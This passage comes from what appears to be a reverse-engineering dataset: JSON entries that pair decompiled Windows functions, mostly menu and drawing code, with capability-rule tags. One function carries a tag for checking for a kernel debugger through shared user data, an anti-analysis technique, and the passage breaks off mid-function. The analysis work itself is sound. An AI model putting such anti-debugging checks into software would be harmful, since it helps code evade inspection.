fcn.00426138();\n                    iVar5 = *(lprc - 0x4c);\n                    iVar6 = (**(**(lprc - 0x4c) + 0x20))();\n                    uVar8 = (*(lprc - 4) - *(lprc - 0xc)) - iVar6;\n                    iVar6 = uVar8 >> 1;\n                    if (iVar6 < 0) {\n                        iVar6 = iVar6 + ((uVar8 & 1) != 0);\n                    }\n                    (**(**(lprc - 0x4c) + 0x2c))(iVar6 + *(lprc - 0xc) + 1);\n                    fcn.00426bfc(iVar5);\n                    fcn.00426138();\n                    *in_FS_OFFSET = iVar5;\n                    fcn.00403820(0x44e203);\n                    return;\n                }\n                fcn.0044ad14(*(lprc - 0x38) & 0xffffff00 | *(*(lprc - 0x38) + 0x39), *(*(lprc - 0x38) + 0x40), \n                             *(lprc - 0xc));\n            }\n            if (*(*(lprc - 0x38) + 0x38) != '\\0') {\n                *(lprc - 8) = *(lprc - 8) + -1;\n                *(lprc - 4) = *(lprc - 4) + -1;\n            }\n        }\n    }\n    *(lprc - 0x10) = *(lprc - 0x10) + -1;\n    *(lprc - 0xc) = *(lprc - 0xc) + -1;\n    *(lprc - 8) = *(lprc - 8) + 2;\n    *(lprc - 4) = *(lprc - 4) + 2;\n    if (((*(*(lprc - 0x38) + 0x38) != '\\0') || ((*(lprc - 0x29) != '\\0' && (*(lprc - 0x39) != '\\0')))) &&\n       (*(lprc - 0x21) == '\\0')) {\n        uVar7 = fcn.0042704c();\n        sub.user32.dll_DrawEdge(uVar7);\n    }\n    if (*(lprc - 0x29) != '\\0') {\n        if (*(lprc - 0x39) != '\\0') {\n            *(lprc - 0x20) = *(lprc - 8) + 1;\n        }\n        if ((*(lprc - 0x5d) == '\\0') || (*(lprc + 8) == '\\0')) {\n            fcn.00426904();\n        }\n        fcn.00426ca8();\n    }\n    if (((*(lprc + 8) != '\\0') && (*(lprc - 0x5d) != '\\0')) && (*(lprc - 0x21) == '\\0')) {\n        if (*(lprc - 0x29) == '\\0') {\n            if ((*(lprc + 0xc) & 0x40) != 0) {\n                uVar7 = fcn.0042704c();\n                sub.user32.dll_DrawEdge(uVar7);\n            }\n        }\n        else {\n            uVar7 = fcn.0042704c();\n            sub.user32.dll_DrawEdge(uVar7);\n        }\n        if (*(lprc - 0x29) == '\\0') {\n            iStack32 = lprc - 0x20;\n            sub.user32.dll_OffsetRect();\n        }\n    }\n    if ((*(lprc - 0x29) == '\\0') || (*(lprc - 0x39) == '\\0')) {\n        *(lprc - 0x20) = *(lprc - 8) + 1;\n    }\n    *(lprc - 0x20) = *(lprc - 0x20) + 2;\n    *(lprc - 0x18) = *(lprc - 0x18) + -1;\n    *(lprc - 100) = *(*(lprc - 0x31) * 2 + 0x483de0) | 0x60;\n    if ((*(lprc - 0x65) != '\\0') && ((*(lprc + 0xd) & 1) != 0)) {\n        *(lprc - 100) = *(lprc - 100) | 0x100000;\n    }\n    *(lprc - 0x5c) = *(lprc - 0x20);\n    *(lprc - 0x58) = *(lprc - 0x1c);\n    *(lprc - 0x54) = *(lprc - 0x18);\n    *(lprc - 0x50) = *(lprc - 0x14);\n    if ((*(lprc + 0xc) & 0x20) != 0) {\n        fcn.00426404();\n    }\n    fcn.0044da38(*(lprc - 100) | 0x500, lprc & 0xffffff00 | *(lprc - 0x29), lprc - 0x20);\n    uVar8 = (*(lprc - 0x50) - *(lprc - 0x58)) - (*(lprc - 0x14) - *(lprc - 0x1c));\n    iVar5 = uVar8 >> 1;\n    if (iVar5 < 0) {\n        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n    }\n    sub.user32.dll_OffsetRect(lprc - 0x20, 0, iVar5);\n    if ((((*(lprc + 8) != '\\0') && (*(lprc - 0x29) != '\\0')) && (*(lprc - 0x5d) != '\\0')) && (*(lprc - 0x21) == '\\0')) {\n        sub.user32.dll_OffsetRect(lprc - 0x20, 1, 0);\n    }\n    fcn.0044da38(*(lprc - 100), lprc & 0xffffff00 | *(lprc - 0x29), lprc - 0x20);\n    if ((*(*(lprc - 0x38) + 0x60) != 0) && (*(lprc + 8) == '\\0')) {\n        *(lprc - 0x20) = *(lprc - 0x18);\n        *(lprc - 0x18) = *(lprc - 0x54) + -10;\n        iVar5 = lprc - 0x20;\n        uVar8 = lprc & 0xffffff00 | *(lprc - 0x29);\n        in_stack_ffffffa4 = 2;\n        fcn.0044cafc();\n        fcn.0044da38(in_stack_ffffffa4, uVar8, iVar5);\n    }\n    *in_FS_OFFSET = in_stack_ffffffa4;\n    fcn.004045c8(0x44e59a);\n    return;\n}\n",
        "token_count": 4097
    },
    "0044e5b0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044e5b0(uint32_t lprc)\n\n{\n    int32_t *piVar1;\n    uchar *puVar2;\n    char cVar3;\n    uchar uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint32_t uVar8;\n    int32_t *in_FS_OFFSET;\n    bool bVar9;\n    int32_t in_stack_ffffffa4;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x44eedb;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puVar2 = &stack0xfffffffc;\n    if (*(lprc - 0x21) != '\\0') {\n        if (((*(lprc + 0xc) & 1) == 0) && ((*(lprc + 0xc) & 0x40) == 0)) {\n            puVar2 = &stack0xfffffffc;\n            if (*(lprc + 8) != '\\0') {\n                fcn.00426904();\n                puVar2 = puStack24;\n            }\n        }\n        else {\n            puStack24 = &stack0xfffffffc;\n            fcn.00430404();\n            cVar3 = fcn.0043050c();\n            if (cVar3 == '\\0') {\n                fcn.00426904();\n            }\n            else {\n                fcn.00426904();\n            }\n            fcn.00426138();\n            puVar2 = puStack24;\n        }\n    }\n    puStack24 = puVar2;\n    if ((*(lprc - 0x29) == '\\0') || ((*(lprc - 0x21) != '\\0' && (*(*(lprc - 0x38) + 0x38) == '\\0')))) {\n        fcn.00426ca8();\n    }\n    if (*(lprc - 0x30) == 0) {\n        cVar3 = fcn.004039b8();\n        if (cVar3 == '\\0') {\n            *(lprc - 0x31) = 0;\n        }\n        else {\n            *(lprc - 0x31) = *(*(lprc - 0x30) + 0x60);\n        }\n    }\n    else {\n        *(lprc - 0x31) = 0;\n    }\n    *(lprc - 8) = *(lprc - 0x18) + -1;\n    iVar5 = *(lprc - 0x1c) + 1;\n    bVar9 = iVar5 == 0;\n    *(lprc - 0xc) = iVar5;\n    fcn.004049d4();\n    if (bVar9) {\n        fcn.00426ca8();\n        *(lprc - 0x10) = *(lprc - 8) + 2;\n        *(lprc - 8) = 0;\n        *(lprc - 0x39) = 0;\n    }\n    else {\n        if ((*(lprc - 0x40) == 0) ||\n           (((iVar5 = *(*(lprc - 0x38) + 0x40),  iVar5 < 0 || (iVar6 = fcn.0044aa24(),  iVar6 <= iVar5)) &&\n            ((*(*(lprc - 0x38) + 0x38) == '\\0' ||\n             ((piVar1 = *(*(lprc - 0x38) + 0x4c),  piVar1 != NULL && (cVar3 = (**(*piVar1 + 0x1c))(),  cVar3 == '\\0'))))\n            )))) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = 1;\n        }\n        *(lprc - 0x41) = uVar4;\n        if ((*(lprc - 0x41) == '\\0') &&\n           ((piVar1 = *(*(lprc - 0x38) + 0x4c),  piVar1 == NULL || (cVar3 = (**(*piVar1 + 0x1c))(),  cVar3 != '\\0')))) {\n            if ((*(lprc - 0x40) == 0) || (*(lprc + 8) != '\\0')) {\n                *(lprc - 0x10) = *(lprc - 8);\n                *(lprc - 4) = *(lprc - 0xc);\n            }\n            else {\n                *(lprc - 0x10) = *(lprc - 8) - *(*(lprc - 0x40) + 0x34);\n                *(lprc - 4) = *(lprc - 0xc) + *(*(lprc - 0x40) + 0x30);\n            }\n            *(lprc - 0x39) = 0;\n        }\n        else {\n            *(lprc - 0x39) = 1;\n            if (*(lprc - 0x41) == '\\0') {\n                *(lprc - 0x10) = *(lprc - 8) + -0x10;\n                *(lprc - 4) = *(lprc - 0xc) + 0x10;\n            }\n            else {\n                *(lprc - 0x10) = *(lprc - 8) - *(*(lprc - 0x40) + 0x34);\n                *(lprc - 4) = *(lprc - 0xc) + *(*(lprc - 0x40) + 0x30);\n            }\n            if (*(*(lprc - 0x38) + 0x38) != '\\0') {\n                *(lprc - 0x10) = *(lprc - 0x10) + -1;\n                *(lprc - 4) = *(lprc - 4) + 1;\n                uVar7 = fcn.004268fc();\n                *(lprc - 0x48) = uVar7;\n                if ((*(lprc + 0xc) & 1) == 0) {\n                    uVar7 = fcn.004268fc();\n                    *(lprc - 0x48) = uVar7;\n                    fcn.0042d4fc();\n                    fcn.004268d8();\n                    fcn.00426ca8();\n                }\n                else {\n                    fcn.00426904();\n                    fcn.00426ca8();\n                }\n                fcn.00426904();\n                *(lprc - 8) = *(lprc - 8) + -1;\n                *(lprc - 0xc) = *(lprc - 0xc) + 1;\n            }\n            if (*(lprc - 0x41) == '\\0') {\n                *(lprc - 0x5c) = *(lprc - 0x10);\n                *(lprc - 0x58) = *(lprc - 0xc);\n                *(lprc - 0x54) = *(lprc - 8);\n                *(lprc - 0x50) = *(lprc - 4);\n                iVar5 = (**(**(*(lprc - 0x38) + 0x4c) + 0x2c))();\n                if (iVar5 < *(lprc - 8) - *(lprc - 0x10)) {\n                    iVar5 = (**(**(*(lprc - 0x38) + 0x4c) + 0x2c))();\n                    uVar8 = (*(lprc - 8) - *(lprc - 0x10)) - iVar5;\n                    iVar5 = uVar8 >> 1;\n                    if (iVar5 < 0) {\n                        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n                    }\n                    *(lprc - 8) = (*(lprc - 8) - iVar5) + 1;\n                    iVar5 = (**(**(*(lprc - 0x38) + 0x4c) + 0x2c))();\n                    *(lprc - 0x10) = *(lprc - 8) - iVar5;\n                }\n                iVar5 = (**(**(*(lprc - 0x38) + 0x4c) + 0x20))();\n                if (iVar5 < *(lprc - 4) - *(lprc - 0xc)) {\n                    iVar5 = (**(**(*(lprc - 0x38) + 0x4c) + 0x20))();\n                    uVar8 = (*(lprc - 4) - *(lprc - 0xc)) - iVar5;\n                    iVar5 = uVar8 >> 1;\n                    if (iVar5 < 0) {\n                        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n                    }\n                    *(lprc - 0xc) = iVar5 + *(lprc - 0xc) + 1;\n                    iVar5 = (**(**(*(lprc - 0x38) + 0x4c) + 0x20))();\n                    *(lprc - 4) = iVar5 + *(lprc - 0xc);\n                }\n                fcn.00426e2c();\n                *(lprc - 0x10) = *(lprc - 0x5c);\n                *(lprc - 0xc) = *(lprc - 0x58);\n                *(lprc - 8) = *(lprc - 0x54);\n                *(lprc - 4) = *(lprc - 0x50);\n            }\n            else {\n                iVar5 = *(*(lprc - 0x38) + 0x40);\n                if ((iVar5 < 0) || (iVar6 = fcn.0044aa24(),  iVar6 <= iVar5)) {\n                    uVar7 = fcn.0042b3a8();\n                    *(lprc - 0x4c) = uVar7;\n                    *in_FS_OFFSET = &stack0xffffffd4;\n                    (**(**(lprc - 0x4c) + 0x3c))();\n                    sub.user32.dll_LoadBitmapA(0, 0x7ff8);\n                    fcn.0042c498();\n                    *(lprc - 0x48) = *(*(*(lprc - 0x28) + 0xc) + 0x18);\n                    fcn.00426138();\n                    iVar5 = *(lprc - 0x4c);\n                    iVar6 = (**(**(lprc - 0x4c) + 0x20))();\n                    uVar8 = (*(lprc - 4) - *(lprc - 0xc)) - iVar6;\n                    iVar6 = uVar8 >> 1;\n                    if (iVar6 < 0) {\n                        iVar6 = iVar6 + ((uVar8 & 1) != 0);\n                    }\n                    (**(**(lprc - 0x4c) + 0x2c))(iVar6 + *(lprc - 0xc) + 1);\n                    fcn.00426bfc(iVar5);\n                    fcn.00426138();\n                    *in_FS_OFFSET = iVar5;\n                    fcn.00403820(0x44eb33);\n                    return;\n                }\n                fcn.0044ad14(*(lprc - 0x38) & 0xffffff00 | *(*(lprc - 0x38) + 0x39), *(*(lprc - 0x38) + 0x40), \n                             *(lprc - 0xc));\n            }\n            if (*(*(lprc - 0x38) + 0x38) != '\\0') {\n                *(lprc - 8) = *(lprc - 8) + -1;\n                *(lprc - 4) = *(lprc - 4) + -1;\n            }\n        }\n    }\n    *(lprc - 0x10) = *(lprc - 0x10) + -1;\n    *(lprc - 0xc) = *(lprc - 0xc) + -1;\n    *(lprc - 8) = *(lprc - 8) + 2;\n    *(lprc - 4) = *(lprc - 4) + 2;\n    if ((*(*(lprc - 0x38) + 0x38) != '\\0') ||\n       (((*(lprc - 0x29) != '\\0' && (*(lprc - 0x39) != '\\0')) && (*(lprc - 0x21) == '\\0')))) {\n        uVar7 = fcn.0042704c();\n        sub.user32.dll_DrawEdge(uVar7);\n    }\n    if (*(lprc - 0x29) != '\\0') {\n        if (*(lprc - 0x39) != '\\0') {\n            *(lprc - 0x18) = *(lprc - 0x10) + -1;\n        }\n        if ((*(lprc - 0x5d) == '\\0') || (*(lprc + 8) == '\\0')) {\n            fcn.00426904();\n        }\n        fcn.00426ca8();\n    }\n    if (((*(lprc + 8) != '\\0') && (*(lprc - 0x5d) != '\\0')) && (*(lprc - 0x21) == '\\0')) {\n        if (*(lprc - 0x29) == '\\0') {\n            if ((*(lprc + 0xc) & 0x40) != 0) {\n                uVar7 = fcn.0042704c();\n                sub.user32.dll_DrawEdge(uVar7);\n            }\n        }\n        else {\n            uVar7 = fcn.0042704c();\n            sub.user32.dll_DrawEdge(uVar7);\n        }\n        if (*(lprc - 0x29) == '\\0') {\n            iStack32 = lprc - 0x20;\n            sub.user32.dll_OffsetRect();\n        }\n    }\n    if ((*(lprc - 0x29) == '\\0') || (*(lprc - 0x39) == '\\0')) {\n        *(lprc - 0x18) = *(lprc - 0x10) + -1;\n    }\n    *(lprc - 0x20) = *(lprc - 0x20) + 2;\n    *(lprc - 0x18) = *(lprc - 0x18) + -1;\n    *(lprc - 100) = *(*(lprc - 0x31) * 2 + 0x483de0) | 0x60;\n    if ((*(lprc - 0x65) != '\\0') && ((*(lprc + 0xd) & 1) != 0)) {\n        *(lprc - 100) = *(lprc - 100) | 0x100000;\n    }\n    *(lprc - 0x5c) = *(lprc - 0x20);\n    *(lprc - 0x58) = *(lprc - 0x1c);\n    *(lprc - 0x54) = *(lprc - 0x18);\n    *(lprc - 0x50) = *(lprc - 0x14);\n    if ((*(lprc + 0xc) & 0x20) != 0) {\n        fcn.00426404();\n    }\n    fcn.0044da38(*(lprc - 100) | 0x500, lprc & 0xffffff00 | *(lprc - 0x29), lprc - 0x20);\n    *(lprc - 0x20) = *(lprc - 0x5c);\n    *(lprc - 0x18) = *(lprc - 0x54);\n    uVar8 = (*(lprc - 0x50) - *(lprc - 0x58)) - (*(lprc - 0x14) - *(lprc - 0x1c));\n    iVar5 = uVar8 >> 1;\n    if (iVar5 < 0) {\n        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n    }\n    sub.user32.dll_OffsetRect(lprc - 0x20, 0, iVar5);\n    if (((*(lprc + 8) != '\\0') && (*(lprc - 0x29) != '\\0')) && (*(lprc - 0x5d) != '\\0')) {\n        sub.user32.dll_OffsetRect(lprc - 0x20, 1, 0);\n    }\n    fcn.0044da38(*(lprc - 100), lprc & 0xffffff00 | *(lprc - 0x29), lprc - 0x20);\n    if ((*(*(lprc - 0x38) + 0x60) != 0) && (*(lprc + 8) == '\\0')) {\n        fcn.0044cafc();\n        *(lprc - 0x20) = 10;\n        iVar5 = fcn.00426eac();\n        *(lprc - 0x18) = iVar5 + *(lprc - 0x20);\n        in_stack_ffffffa4 = 2;\n        fcn.0044da38(2, lprc & 0xffffff00 | *(lprc - 0x29), lprc - 0x20);\n    }\n    *in_FS_OFFSET = in_stack_ffffffa4;\n    fcn.004045c8(0x44eee2);\n    return;\n}\n",
        "token_count": 4127
    },
    "0044eef8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044eef8(uint noname_0, uint32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_ECX;\n    uint var_65h;\n    uint var_5dh;\n    uint var_40h;\n    uint var_38h;\n    uint var_30h;\n    uint var_28h;\n    uint var_20h;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    \n    var_20h = *in_ECX;\n    uStack32 = in_ECX[1];\n    uStack28 = in_ECX[2];\n    uStack24 = in_ECX[3];\n    iVar2 = fcn.0044fa10();\n    iVar3 = fcn.0044f02c();\n    if (((iVar2 == 0) || ((*(iVar2 + 0x40) == '\\0' && (iVar3 == 0)))) ||\n       ((*(in_EAX + 0x9a) == 0 && (*(in_EAX + 0x92) == 0)))) {\n        if ((iVar2 == 0) || (cVar1 = fcn.0045107c(),  cVar1 != '\\0')) {\n            fcn.0044e5b0(&stack0xfffffffc);\n        }\n        else {\n            fcn.0044dc88(&stack0xfffffffc);\n        }\n    }\n    else {\n        (**(*in_EAX + 0x34))(in_EAX & 0xffffff00 | (arg_ch & 1) != 0);\n        if (*(in_EAX + 0x9a) != 0) {\n            (*in_EAX[0x26])(&var_20h & 0xffff0000 | arg_ch & 0xffff, &var_20h);\n        }\n    }\n    return;\n}\n",
        "token_count": 430
    },
    "0044f8d8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044f8d8(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (param_2 == 0) {\n        fcn.00403820();\n        *(in_EAX + 0x44) = 0;\n    }\n    else {\n        if (*(in_EAX + 0x44) == 0) {\n            iVar1 = fcn.00403a28();\n            uVar2 = (**(iVar1 + 0x14))();\n            *(in_EAX + 0x44) = uVar2;\n        }\n        (**(**(in_EAX + 0x44) + 0xc))();\n        iVar1 = *(in_EAX + 0x44);\n        *(iVar1 + 0xc) = in_EAX;\n        *(iVar1 + 8) = 0x44fb6c;\n        fcn.00403a28();\n        fcn.0042280c();\n    }\n    return;\n}\n",
        "token_count": 238
    },
    "00450d84": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00450d84(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint var_10h;\n    uint var_ch;\n    uchar *var_8h;\n    uint hMenu;\n    \n    iVar1 = sub.user32.dll_GetMenuItemCount();\n    var_8h = arg_8h + -0x200;\n    iVar3 = 0;\n    while ((iVar3 < iVar1 && (var_8h < arg_8h + -5))) {\n        fcn.00451350(0x400, (arg_8h + -5) - var_8h, var_8h);\n        var_8h = fcn.004092a4();\n        uVar2 = sub.user32.dll_GetMenuState();\n        if ((uVar2 & 2) != 0) {\n            *var_8h = 0x24;\n            var_8h = var_8h + 1;\n            *var_8h = 0;\n        }\n        if ((uVar2 & 0x40) != 0) {\n            *var_8h = 0x40;\n            var_8h = var_8h + 1;\n            *var_8h = 0;\n        }\n        if ((uVar2 & 1) != 0) {\n            *var_8h = 0x23;\n            var_8h = var_8h + 1;\n            *var_8h = 0;\n        }\n        *var_8h = 0x3b;\n        var_8h = var_8h + 1;\n        *var_8h = 0;\n        iVar3 = iVar3 + 1;\n    }\n    return;\n}\n",
        "token_count": 400
    },
    "00451e68": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00451e68(uint32_t arg_8h)\n\n{\n    bool bVar1;\n    uint8_t uVar2;\n    int32_t *in_EAX;\n    uint16_t extraout_var;\n    uint16_t extraout_var_00;\n    uint16_t extraout_var_01;\n    uint16_t uVar3;\n    uint var_15h;\n    uint var_4h;\n    \n    if ((**0x484460 < 5) && ((**0x484460 != 4 || (**0x4846e4 < 1)))) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    fcn.00403a28();\n    uVar2 = fcn.004039b8();\n    if (((arg_8h & 1) == 0) || ((uVar2 != 0 && ((uVar2 == 0 || (bVar1)))))) {\n        if ((bVar1) && ((arg_8h & 0x80) != 0)) {\n            fcn.00426904();\n            fcn.00426138();\n            uVar3 = extraout_var_00;\n        }\n        else {\n            fcn.00426904();\n            fcn.00426138();\n            uVar3 = extraout_var_01;\n        }\n    }\n    else {\n        fcn.00426904();\n        fcn.00426138();\n        uVar3 = extraout_var;\n    }\n    (**(*in_EAX + 0x30))(arg_8h & 0xff00 | uVar3 << 0x10 | uVar2, arg_8h & 0xffff | uVar3 << 0x10);\n    return;\n}\n",
        "token_count": 385
    },
    "00454370": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t fcn.00454370(void)\n\n{\n    int16_t iVar1;\n    uint32_t in_EAX;\n    uint32_t unaff_EBX;\n    uint32_t uVar2;\n    \n    uVar2 = unaff_EBX & 0xffffff00 | *0x4543c0;\n    if ((in_EAX & 4) != 0) {\n        uVar2 = uVar2 | 1;\n    }\n    if ((in_EAX & 8) != 0) {\n        uVar2 = uVar2 | 4;\n    }\n    if ((in_EAX & 1) != 0) {\n        uVar2 = uVar2 | 8;\n    }\n    if ((in_EAX & 2) != 0) {\n        uVar2 = uVar2 | 0x10;\n    }\n    if ((in_EAX & 0x10) != 0) {\n        uVar2 = uVar2 | 0x20;\n    }\n    iVar1 = sub.user32.dll_GetKeyState(0x12);\n    if (iVar1 < 0) {\n        uVar2 = uVar2 | 2;\n    }\n    return uVar2;\n}\n",
        "token_count": 267
    },
    "00455630": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00455630(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (param_1 != param_2) {\n        if ((*(in_EAX + 0x1c) & 1) == 0) {\n            *(*(in_EAX + 0x208) + 0x1e) = 1;\n            *(*(in_EAX + 0x20c) + 0x1e) = 1;\n        }\n        fcn.00454d54();\n        fcn.00454d54();\n        if (*(in_EAX + 0x210) == '\\0') {\n            if (*(*(in_EAX + 0x208) + 0x1e) != '\\0') {\n                sub.kernel32.dll_MulDiv(*(*(in_EAX + 0x208) + 0x10), param_2, param_1);\n                fcn.00454ea4();\n            }\n            if (*(*(in_EAX + 0x20c) + 0x1e) != '\\0') {\n                sub.kernel32.dll_MulDiv(*(*(in_EAX + 0x20c) + 0x10), param_2, param_1);\n                fcn.00454ea4();\n            }\n        }\n    }\n    *(*(in_EAX + 0x208) + 0x1e) = 0;\n    *(*(in_EAX + 0x20c) + 0x1e) = 0;\n    return;\n}\n",
        "token_count": 348
    },
    "00456774": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00456774(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x2f4) & 1) == 0) {\n        if ((param_2 != '\\0') && (param_2 != *(in_EAX + 0x57))) {\n            fcn.004578ac();\n        }\n        fcn.0043d768();\n    }\n    else {\n        if (param_2 == '\\0') {\n            *(in_EAX + 0x2f4) = *(in_EAX + 0x2f4) & 0xfd;\n            return;\n        }\n        *(in_EAX + 0x2f4) = *(in_EAX + 0x2f4) | 2;\n    }\n    return;\n}\n",
        "token_count": 188
    },
    "00458140": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00458140(uint param_1, int32_t param_2)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x4581e8;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if (param_2 == *(in_EAX + 0x220)) goto code_r0x004581d2;\n    puVar1 = &stack0xfffffffc;\n    if (param_2 == 0) goto code_r0x004581ab;\n    puVar1 = &stack0xfffffffc;\n    if (in_EAX == param_2) {\ncode_r0x0045818a:\n        puStack24 = puVar1;\n        fcn.0040675c();\n        fcn.0040c8dc();\n        fcn.00403fc0();\n        puVar1 = puStack24;\n    }\n    else {\n        iVar3 = fcn.004544bc();\n        puVar1 = puStack24;\n        if (in_EAX != iVar3) goto code_r0x0045818a;\n        if ((*(in_EAX + 0x1c) & 1) == 0) {\n            cVar2 = fcn.00403a28();\n            puVar1 = puStack24;\n            if (cVar2 == '\\0') goto code_r0x0045818a;\n        }\n    }\ncode_r0x004581ab:\n    puStack24 = puVar1;\n    *(in_EAX + 0x220) = param_2;\n    if ((*(in_EAX + 0x1c) & 1) == 0) {\n        if (*(in_EAX + 0x22e) != '\\0') {\n            fcn.00458500();\n        }\n        fcn.00403a28();\n    }\ncode_r0x004581d2:\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x4581ef;\n    uStack28 = 0x4581e7;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 533
    },
    "00458a1c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00458a1c(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    if (((*(*(arg_8h + -4) + 0x229) != '\\0') && ((*(*(arg_8h + -4) + 0x228) & 1) != 0)) &&\n       (*(*(arg_8h + -4) + 0x22f) != '\\x01')) {\n        uVar1 = fcn.0044407c(0);\n        uVar1 = sub.user32.dll_GetSystemMenu(uVar1);\n        if (*(*(arg_8h + -4) + 0x229) == '\\x03') {\n            sub.user32.dll_DeleteMenu(uVar1, 0xf130, 0);\n            sub.user32.dll_DeleteMenu(uVar1, 7, 0x400);\n            sub.user32.dll_DeleteMenu(uVar1, 5, 0x400);\n            sub.user32.dll_DeleteMenu(uVar1, 0xf030, 0);\n            sub.user32.dll_DeleteMenu(uVar1, 0xf020, 0);\n            sub.user32.dll_DeleteMenu(uVar1, 0xf000, 0);\n            sub.user32.dll_DeleteMenu(uVar1, 0xf120, 0);\n        }\n        else {\n            if ((*(*(arg_8h + -4) + 0x228) & 2) == 0) {\n                sub.user32.dll_EnableMenuItem(uVar1, 0xf020, 1);\n            }\n            if ((*(*(arg_8h + -4) + 0x228) & 4) == 0) {\n                sub.user32.dll_EnableMenuItem(uVar1, 0xf030, 1);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 398
    },
    "0045a63c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.0045a63c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x45a713;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar1 = fcn.00442ae0();\n    if (iVar1 == 1) {\n        fcn.0043d7bc();\n        fcn.004046b8();\n        uVar2 = fcn.00404888();\n        fcn.00404a88(uVar2);\n        fcn.0043d7cc();\n        iVar1 = fcn.00404888();\n        if (0 < iVar1) {\n            iVar3 = 1;\n            do {\n                if ((*(iVar3 + -1) == '\\n') || (*(iVar3 + -1) == '\\r')) {\n                    fcn.00404c14();\n                    break;\n                }\n                iVar3 = iVar3 + 1;\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n        fcn.0043d878();\n    }\n    fcn.0044294c();\n    fcn.0043cd5c();\n    if ((*(in_EAX + 0x1c) & 1) == 0) {\n        fcn.00456774();\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x45a71a;\n    uStack32 = 0x45a712;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 421
    },
    "00463738": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00463738(uint param_1, uint *param_2)\n\n{\n    uint *in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint var_2ah;\n    int32_t var_8h;\n    ushort *var_4h;\n    \n    puVar3 = &var_2ah;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = *in_EAX;\n        in_EAX = in_EAX + 1;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = *in_EAX;\n    puVar3 = &var_2ah;\n    puVar4 = param_2;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = *puVar3;\n    if ((var_2ah & 1) != 0) {\n        var_8h = &var_2ah + 2;\n        var_4h = param_2 + 2;\n        *var_4h = 0;\n        *param_2 = var_2ah + 1;\n        fcn.00463338();\n    }\n    uVar1 = *param_2 >> 1;\n    if (uVar1 < 0x20) {\n        do {\n            *(param_2 + 